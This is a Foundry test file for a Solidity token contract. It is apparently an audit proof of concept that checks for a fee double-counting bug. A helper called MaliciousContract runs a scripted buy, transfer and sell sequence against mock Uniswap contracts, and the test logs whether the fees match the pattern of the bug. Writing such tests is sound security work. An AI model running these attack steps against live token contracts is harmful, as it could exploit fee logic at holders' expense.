// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/SecondToken.sol";

contract MaliciousContract {
    SecondToken public token;
    address public uniswapPair;

    constructor(SecondToken _token, address _uniswapPair) {
        token = _token;
        uniswapPair = _uniswapPair;
    }

    function transferOut(uint256 amount) external {
        token.transfer(uniswapPair, amount);
    }
}

contract MockWETH {
    function balanceOf(address) external pure returns (uint256) {
        return 1 ether;
    }
}

contract MockRouter {
    address public immutable factory;
    address public immutable WETH;

    constructor(address _factory, address _weth) {
        factory = _factory;
        WETH = _weth;
    }
}

contract MockFactory {
    function createPair(address, address) external pure returns (address) {
        return address(0xCAFEBABE);
    }
}

contract FeeDoubleCountTest is Test {
    SecondToken token;
    MaliciousContract maliciousContract;

    address weth = address(new MockWETH());
    address mockPair = address(0xCAFEBABE);
    address mockFactory = address(new MockFactory());
    address mockRouter = address(new MockRouter(mockFactory, weth));

    address multiSig = makeAddr("multisig");
    address alice = makeAddr("alice");
    address feeBeneficiary = address(this);

    function setUp() public {
        // Deploy token contract
        token = new SecondToken(mockRouter, multiSig);
        
        // Grant multisig additional roles
        vm.startPrank(multiSig);
        token.setRoleSuperAdmin(multiSig);
        vm.stopPrank();

        // Compute role hashes
        bytes32 bossControlRole = token.BOSS_CONTROL_ROLE();
        bytes32 minterRole = token.MINTER_ROLE();
        bytes32 feeControlRole = token.FEE_CONTROL_ROLE();
        bytes32 whitelistControlRole = token.WHITELIST_CONTROL_ROLE();
        
        // Setup roles
        vm.startPrank(multiSig);
        token.grantRole(bossControlRole, feeBeneficiary);
        token.grantRole(minterRole, feeBeneficiary);
        token.grantRole(feeControlRole, feeBeneficiary);
        token.grantRole(whitelistControlRole, feeBeneficiary);
        vm.stopPrank();

        // Configure token
        vm.prank(feeBeneficiary);
        token.setFeeRate(10, 10); // Set buy/sell fees to 10%
        
        vm.prank(feeBeneficiary);
        token.setAddressForBosses(feeBeneficiary);
        
        // Mint initial tokens to test contract
        vm.prank(feeBeneficiary);
        token.mint(address(this), 2000 ether);
        
        // Deploy attack contract
        maliciousContract = new MaliciousContract(token, mockPair);
    }

    function test_doubleFeeVulnerability() public {
        // Record initial token contract balance
        uint256 initialFeeBalance = token.balanceOf(address(token));
        console.log("--- BEFORE-Trigger ---");
        console.log("Initial fee balance: %d ether", initialFeeBalance);

        // Transfer to mockPair (liquidity setup)
        token.transfer(mockPair, 1000 ether);

        console.log("--- Trigger: Start Attack Steps ---");
        // Step 1: Pair transfers to Alice (buy transaction - 10% fee)
        vm.prank(mockPair);
        token.transfer(alice, 100 ether);
        
        // Step 2: Alice transfers to malicious contract (no fee)
        vm.prank(alice);
        token.transfer(address(maliciousContract), token.balanceOf(alice));
        
        // Step 3: Malicious contract transfers to pair (sell transaction - 10% fee)
        maliciousContract.transferOut(token.balanceOf(address(maliciousContract)));
        console.log("--- Trigger: End Attack Steps ---");

        console.log("--- AFTER-Trigger ---");
        uint256 finalFeeBalance = token.balanceOf(address(token));
        console.log("Final fee balance: %d ether", finalFeeBalance);
        uint256 totalFees = finalFeeBalance - initialFeeBalance;
        console.log("Total accumulated fees: %d ether", totalFees);

        // Vulnerability verification
        if (totalFees == 119 ether) {
            console.log("Vulnerability Exists: Fee accumulation matches double fee vulnerability (119 ether)");
        } else {
            console.log("Vulnerability not Exist: Fee accumulation (%d ether) does not match double fee pattern", totalFees);
        }
    }
}